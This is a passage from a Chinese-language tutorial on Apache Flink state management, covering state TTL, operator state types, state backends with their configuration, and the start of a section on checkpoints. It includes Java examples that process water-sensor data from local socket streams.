class="line">stateDescriptor.enableTimeToLive(ttlConfig);</span><br></pre></td></tr></table></figure><ul><li>newBuilder()</li></ul><p>状态TTL配置的构造器方法，必须调用，返回一个Builder之后再调用.build()方法就可以得到StateTtlConfig了。方法需要传入一个Time作为参数，这就是<strong>设定的状态生存时间</strong>。</p><ul><li>setUpdateType()</li></ul><p>设置更新类型。更新类型<strong>指定了什么时候更新状态失效时间</strong>，这里的OnCreateAndWrite表示只有创建状态和更改状态（写操作）时更新失效时间。另一种类型OnReadAndWrite则表示无论读写操作都会更新失效时间，也就是只要对状态进行了访问，就表明它是活跃的，从而延长生存时间。这个配置默认为OnCreateAndWrite。</p><ul><li>setStateVisibility()</li></ul><p>设置状态的可见性。<strong>所谓的“状态可见性”，是指因为清除操作并不是实时的，所以当状态过期之后还有可能继续存在，这时如果对它进行访问，能否正常读取到就是一个问题了</strong>。这里设置的NeverReturnExpired是默认行为，表示从不返回过期值，也就是只要过期就认为它已经被清除了，应用不能继续读取；这在处理会话或者隐私数据时比较重要。对应的另一种配置是ReturnExpireDefNotCleanedUp，就是如果过期状态还存在，就返回它的值。</p><p>除此之外，TTL配置还可以设置在保存检查点（checkpoint）时触发清除操作，或者配置增量的清理（incremental cleanup），还可以针对RocksDB状态后端使用压缩过滤器（compaction filter）进行后台清理。这里需要注意，目前的TTL设置只支持处理时间。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StateTTLDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction())</span><br><span class="line">                .assignTimestampsAndWatermarks(</span><br><span class="line">                        WatermarkStrategy</span><br><span class="line">                                .&lt;WaterSensor&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">3</span>))</span><br><span class="line">                                .withTimestampAssigner((element, ts) -&gt; element.getTs() * <span class="number">1000L</span>)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        sensorDS.keyBy(r -&gt; r.getId())</span><br><span class="line">                .process(</span><br><span class="line">                        <span class="keyword">new</span> KeyedProcessFunction&lt;String, WaterSensor, String&gt;() &#123;</span><br><span class="line"></span><br><span class="line">                            ValueState&lt;Integer&gt; lastVcState;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="keyword">super</span>.open(parameters);</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// TODO 1.创建 StateTtlConfig</span></span><br><span class="line">                                StateTtlConfig stateTtlConfig = StateTtlConfig</span><br><span class="line">                                        .newBuilder(Time.seconds(<span class="number">5</span>)) <span class="comment">// 过期时间5s</span></span><br><span class="line"><span class="comment">//                                        .setUpdateType(StateTtlConfig.UpdateType.OnCreateAndWrite) // 状态 创建和写入（更新） 更新 过期时间</span></span><br><span class="line">                                        .setUpdateType(StateTtlConfig.UpdateType.OnReadAndWrite) <span class="comment">// 状态 读取、创建和写入（更新） 更新 过期时间</span></span><br><span class="line">                                        .setStateVisibility(StateTtlConfig.StateVisibility.NeverReturnExpired) <span class="comment">// 不返回过期的状态值</span></span><br><span class="line">                                        .build();</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// TODO 2.状态描述器 启用 TTL</span></span><br><span class="line">                                ValueStateDescriptor&lt;Integer&gt; stateDescriptor = <span class="keyword">new</span> ValueStateDescriptor&lt;&gt;(<span class="string">"lastVcState"</span>, Types.INT);</span><br><span class="line">                                stateDescriptor.enableTimeToLive(stateTtlConfig);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                <span class="keyword">this</span>.lastVcState = getRuntimeContext().getState(stateDescriptor);</span><br><span class="line"></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(WaterSensor value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="comment">// 先获取状态值，打印 ==》 读取状态</span></span><br><span class="line">                                Integer lastVc = lastVcState.value();</span><br><span class="line">                                out.collect(<span class="string">"key="</span> + value.getId() + <span class="string">",状态值="</span> + lastVc);</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// 如果水位大于10，更新状态值 ===》 写入状态</span></span><br><span class="line">                                <span class="keyword">if</span> (value.getVc() &gt; <span class="number">10</span>) &#123;</span><br><span class="line">                                    lastVcState.update(value.getVc());</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                )</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、算子状态（Operator-State）">3、算子状态（Operator State）</h2><p>算子状态（Operator State）就是一个算子并行实例上定义的状态，<strong>作用范围被限定为当前算子任务</strong>。算子状态跟数据的key无关，所以不同key的数据只要被分发到同一个并行子任务，就会访问到同一个Operator State。<strong>算子状态的实际应用场景不如Keyed State多</strong>，一般用在Source或Sink等与外部系统连接的算子上，或者完全没有key定义的场景。比如Flink的Kafka连接器中，就用到了算子状态。算子状态也支持不同的结构类型，主要有三种：ListState、UnionListState和BroadcastState</p><h3 id="3-1列表状态（ListState）">3.1列表状态（ListState）</h3><p>与Keyed State中的ListState一样，将状态表示为一组数据的列表。与Keyed State中的列表状态的区别是：在算子状态的上下文中，不会按键（key）分别处理状态，所以每一个并行子任务上只会保留一个“列表”（list），也就是当前并行子任务上所有状态项的集合。列表中的状态项就是可以重新分配的最细粒度，彼此之间完全独立。</p><p>当算子并行度进行缩放调整时，算子的列表状态中的所有元素项会被统一收集起来，相当于把多个分区的列表合并成了一个“大列表”，然后再均匀地分配给所有并行任务。这种“均匀分配”的具体方法就是“轮询”（round-robin），与之前介绍的rebanlance数据传输方式类似，是通过逐一“发牌”的方式将状态项平均分配的。这种方式也叫作“平均分割重组”（even-split redistribution）。</p><p>算子状态中不会存在“键组”（key group）这样的结构，所以为了方便重组分配，就把它直接定义成了“列表”（list）。这也就解释了，为什么算子状态中没有最简单的值状态（ValueState）。</p><p>**案例实操：**在map算子中计算数据的个数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OperatorListStateDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">2</span>);</span><br><span class="line">        env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> MyCountMapFunction())</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO 1.实现 CheckpointedFunction 接口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyCountMapFunction</span> <span class="keyword">implements</span> <span class="title">MapFunction</span>&lt;<span class="title">String</span>, <span class="title">Long</span>&gt;, <span class="title">CheckpointedFunction</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> Long count = <span class="number">0L</span>;</span><br><span class="line">        <span class="keyword">private</span> ListState&lt;Long&gt; state;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Long <span class="title">map</span><span class="params">(String value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> ++count;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * TODO 2.本地变量持久化：将 本地变量 拷贝到 算子状态中,开启checkpoint时才会调用</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">snapshotState</span><span class="params">(FunctionSnapshotContext context)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"snapshotState..."</span>);</span><br><span class="line">            <span class="comment">// 2.1 清空算子状态</span></span><br><span class="line">            state.clear();</span><br><span class="line">            <span class="comment">// 2.2 将 本地变量 添加到 算子状态 中</span></span><br><span class="line">            state.add(count);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * TODO 3.初始化本地变量：程序启动和恢复时， 从状态中 把数据添加到 本地变量，每个子任务调用一次</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initializeState</span><span class="params">(FunctionInitializationContext context)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"initializeState..."</span>);</span><br><span class="line">            <span class="comment">// 3.1 从 上下文 初始化 算子状态</span></span><br><span class="line">            state = context</span><br><span class="line">                    .getOperatorStateStore()</span><br><span class="line">                    .getListState(<span class="keyword">new</span> ListStateDescriptor&lt;Long&gt;(<span class="string">"state"</span>, Types.LONG));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3.2 从 算子状态中 把数据 拷贝到 本地变量</span></span><br><span class="line">            <span class="keyword">if</span> (context.isRestored()) &#123;</span><br><span class="line">                <span class="keyword">for</span> (Long c : state.get()) &#123;</span><br><span class="line">                    count += c;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-联合列表状态（UnionListState）">3.2 联合列表状态（UnionListState）</h3><p>与ListState类似，联合列表状态也会将状态表示为一个列表。它与常规列表状态的区别在于，算子并行度进行缩放调整时对于状态的分配方式不同。</p><p>UnionListState的重点就在于“联合”（union）。在并行度调整时，常规列表状态是轮询分配状态项，而联合列表状态的算子则会直接广播状态的完整列表。这样，并行度缩放之后的并行子任务就获取到了联合后完整的“大列表”，可以自行选择要使用的状态项和要丢弃的状态项。这种分配也叫作“联合重组”（union redistribution）。如果列表中状态项数量太多，为资源和效率考虑一般不建议使用联合重组的方式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">state = context</span><br><span class="line">              .getOperatorStateStore()</span><br><span class="line">              .getUnionListState(<span class="keyword">new</span> ListStateDescriptor&lt;Long&gt;(<span class="string">"union-state"</span>, Types.LONG));</span><br></pre></td></tr></table></figure><h3 id="3-3-广播状态（BroadcastState）">3.3 广播状态（BroadcastState）</h3><p>有时我们希望算子并行子任务都保持同一份“全局”状态，用来做统一的配置和规则设定。这时所有分区的所有数据都会访问到同一个状态，状态就像被“广播”到所有分区一样，这种特殊的算子状态，就叫作广播状态（BroadcastState）。</p><p>因为广播状态在每个并行子任务上的实例都一样，所以在并行度调整的时候就比较简单，只要复制一份到新的并行任务就可以实现扩展；而对于并行度缩小的情况，可以将多余的并行子任务连同状态直接砍掉——因为状态都是复制出来的，并不会丢失。</p><p>**案例实操：**水位超过指定的阈值发送告警，阈值可以动态修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OperatorBroadcastStateDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 数据流</span></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 配置流（用来广播配置）</span></span><br><span class="line">        DataStreamSource&lt;String&gt; configDS = env.socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">8888</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 1. 将 配置流 广播</span></span><br><span class="line">        MapStateDescriptor&lt;String, Integer&gt; broadcastMapState = <span class="keyword">new</span> MapStateDescriptor&lt;&gt;(<span class="string">"broadcast-state"</span>, Types.STRING, Types.INT);</span><br><span class="line">        BroadcastStream&lt;String&gt; configBS = configDS.broadcast(broadcastMapState);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 2.把 数据流 和 广播后的配置流 connect</span></span><br><span class="line">        BroadcastConnectedStream&lt;WaterSensor, String&gt; sensorBCS = sensorDS.connect(configBS);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 3.调用 process</span></span><br><span class="line">        sensorBCS</span><br><span class="line">                .process(</span><br><span class="line">                        <span class="keyword">new</span> BroadcastProcessFunction&lt;WaterSensor, String, String&gt;() &#123;</span><br><span class="line">                            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                             * 数据流的处理方法： 数据流 只能 读取 广播状态，不能修改</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@param</span> ctx</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@param</span> out</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">                             */</span></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(WaterSensor value, ReadOnlyContext ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="comment">// TODO 5.通过上下文获取广播状态，取出里面的值（只读，不能修改）</span></span><br><span class="line">                                ReadOnlyBroadcastState&lt;String, Integer&gt; broadcastState = ctx.getBroadcastState(broadcastMapState);</span><br><span class="line">                                Integer threshold = broadcastState.get(<span class="string">"threshold"</span>);</span><br><span class="line">                                <span class="comment">// 判断广播状态里是否有数据，因为刚启动时，可能是数据流的第一条数据先来</span></span><br><span class="line">                                threshold = (threshold == <span class="keyword">null</span> ? <span class="number">0</span> : threshold);</span><br><span class="line">                                <span class="keyword">if</span> (value.getVc() &gt; threshold) &#123;</span><br><span class="line">                                    out.collect(value + <span class="string">",水位超过指定的阈值："</span> + threshold + <span class="string">"!!!"</span>);</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                             * 广播后的配置流的处理方法:  只有广播流才能修改 广播状态</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@param</span> ctx</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@param</span> out</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">                             */</span></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processBroadcastElement</span><span class="params">(String value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="comment">// TODO 4. 通过上下文获取广播状态，往里面写数据</span></span><br><span class="line">                                BroadcastState&lt;String, Integer&gt; broadcastState = ctx.getBroadcastState(broadcastMapState);</span><br><span class="line">                                broadcastState.put(<span class="string">"threshold"</span>, Integer.valueOf(value));</span><br><span class="line"></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                )</span><br><span class="line">                .print();</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、状态后端（State-Backends）">4、状态后端（State Backends）</h2><p>在Flink中，状态的存储、访问以及维护，都是由一个可插拔的组件决定的，这个组件就叫作状态后端（state backend）。状态后端主要负责<strong>管理本地状态的存储方式和位置</strong></p><h3 id="4-1-状态后端的分类（HashMapStateBackend-RocksDB）">4.1 状态后端的分类（HashMapStateBackend/RocksDB）</h3><p>状态后端是一个“开箱即用”的组件，可以在不改变应用程序逻辑的情况下独立配置。Flink中提供了两类不同的状态后端，一种是“哈希表状态后端”（HashMapStateBackend），另一种是“内嵌RocksDB状态后端”（EmbeddedRocksDBStateBackend）。如果没有特别配置，系统默认的状态后端是HashMapStateBackend</p><ul><li><strong>哈希表状态后端（HashMapStateBackend）</strong></li></ul><p>HashMapStateBackend是把<strong>状态存放在内存里</strong>。具体实现上，哈希表状态后端在内部会直接把状态当作对象（objects），保存在<strong>Taskmanager的JVM堆上</strong>。普通的状态，以及窗口中收集的数据和触发器，都会以键值对的形式存储起来，所以底层是一个哈希表（HashMap），这种状态后端也因此得名。</p><ul><li><strong>内嵌RocksDB状态后端（EmbeddedRocksDBS</strong>tateBacken<strong>d）</strong></li></ul><p>RocksDB是一种内嵌的key-value存储介质，可以把数据持久化到本地硬盘。配置EmbeddedRocksDBStateBackend后，会将处理中的数据全部放入RocksDB数据库中，RocksDB<strong>默认存储在TaskManager的本地数据目录里</strong>。</p><p>RocksDB的状态数据被<strong>存储为序列化的字节数组</strong>，读写操作需要序列化/反序列化，因此状态的访问性能要差一些。另外，因为做了序列化，key的比较也会按照字节进行，而不是直接调用.hashCode()和.equals()方法。</p><p>EmbeddedRocksDBStateBackend始终执行的是<strong>异步快照</strong>，所以不会因为保存检查点而阻塞数据的处理；而且它还提供了<strong>增量式保存检查点</strong>的机制，这在很多情况下可以大大提升保存效率</p><h3 id="4-2-如何选择正确的状态后端">4.2 如何选择正确的状态后端</h3><p><strong>HashMap和RocksDB两种状态后端最大的区别，就在于本地状态存放在哪里</strong>。</p><p>HashMapStateBackend是<strong>内存计算</strong>，读写速度非常快；但是，状态的大小会受到集群可用内存的限制，如果应用的状态随着时间不停地增长，就会耗尽内存资源。</p><p>而RocksDB是硬盘存储，所以可以根据可用的磁盘空间进行扩展，所以它非常<strong>适合于超级海量状态的存储</strong>。不过由于每个状态的读写都需要做序列化/反序列化，而且可能需要直接从磁盘读取数据，这就会导致性能的降低，平均读写性能要比HashMapStateBackend慢一个数量级</p><h3 id="4-3-状态后端的配置">4.3 状态后端的配置</h3><p>在不做配置的时候，应用程序使用的默认状态后端是由集群配置文件<code>flink-conf.yaml</code>中指定的，配置的键名称为<code>state.backend</code>。这个默认配置对集群上运行的所有作业都有效，我们可以通过更改配置值来改变默认的状态后端。另外，我们还可以在代码中为当前作业单独配置状态后端，这个配置会覆盖掉集群配置文件的默认值</p><ul><li><strong>配置默认的状态后端</strong></li></ul><p>在<code>flink-conf.yaml</code>中，可以使用state.backend来配置默认状态后端。配置项的可能值为hashmap，这样配置的就是HashMapStateBackend；如果配置项的值是rocksdb，这样配置的就是EmbeddedRocksDBStateBackend</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认状态后端</span></span><br><span class="line">state.backend: hashmap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存放检查点的文件路径</span></span><br><span class="line">state.checkpoints.dir: hdfs://hadoop102:8020/flink/checkpoints</span><br><span class="line"><span class="comment"># 这里的state.checkpoints.dir配置项，定义了检查点和元数据写入的目录</span></span><br></pre></td></tr></table></figure><ul><li><strong>为每个作业（Per-job/Application）单独配置状态后端</strong></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过执行环境设置，HashMapStateBackend</span></span><br><span class="line">StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">env.setStateBackend(<span class="keyword">new</span> HashMapStateBackend());</span><br><span class="line"><span class="comment">// 通过执行环境设置，EmbeddedRocksDBStateBackend</span></span><br><span class="line">StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">env.setStateBackend(<span class="keyword">new</span> EmbeddedRocksDBStateBackend());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要注意，如果想在IDE中使用EmbeddedRocksDBStateBackend，需要为Flink项目添加依赖</span></span><br><span class="line"><span class="comment">// 而由于Flink发行版中默认就包含了RocksDB(服务器上解压的Flink)，所以只要我们的代码中没有使用RocksDB的相关内容，就不需要引入这个依赖</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.flink&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;flink-statebackend-rocksdb&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;$&#123;flink.version&#125;&lt;/version&gt;</span><br><span class="line">&lt;/dependency</span><br></pre></td></tr></table></figure><h1>八、容错机制</h1><h2 id="1、检查点（Checkpoint）">1、检查点（Checkpoint）</h2><p><img src="http://qnypic.shawncoding.top/blog/202404161646765.png" alt></p><h3 id="1-1-检查点的保存">1.1 检查点的保存</h3><ul><li><strong>周期性的触发保存</strong></li><li><strong>保存的时间点</strong></li></ul><p>我们应该在所有任务（算子）都恰好处理完一个相同的输入数据的时候，将它们的状态保存下来。这样做可以实现一个数据被所有任务（算子）完整地处理完，状态得到了保存。</p><p>如果出现故障，我们恢复到之前保存的状态，故障时正在处理的所有数据都需要重新处理；我们只需要让源（source）任务向数据源重新提交偏移量、请求重放数据就可以了。</p><ul><li><strong>保存的具体流程</strong></li></ul><p>检查点的保存，最关键的就是要等所有任务将“同一个数据”处理完毕。</p><h3 id="1-2-从检查点恢复状态">1.2 从检查点恢复状态</h3><p>简单来说，就是当flink重启时，会重新定位到最近的检查点，并从该检查点开始重新计算，实现精准一次</p><h2 id="2、检查点算法">2、检查点算法</h2><h3 id="2-1-检查点分界线（Barrier）">2.1 检查点分界线（Barrier）</h3><p>借鉴水位线的设计，在数据流中插入一个特殊的数据结构，专门用来表示触发检查点保存的时间点。收到保存检查点的指令后，Source任务可以在当前数据流中插入这个结构；之后的所有任务只要遇到它就开始对状态做持久化快照保存。由于数据流是保持顺序依次处理的，因此遇到这个标识就代表之前的数据都处理完了，可以保存一个检查点；而在它之后的数据，引起的状态改变就不会体现在这个检查点中，而需要保存到下一个检查点。</p><p>这种特殊的数据形式，把一条流上的数据按照不同的检查点分隔开，所以就叫做<strong>检查点的“分界线”（Checkpoint Barrier）</strong>。</p><h3 id="2-2-分布式快照算法（Barrier对齐的精准一次）">2.2 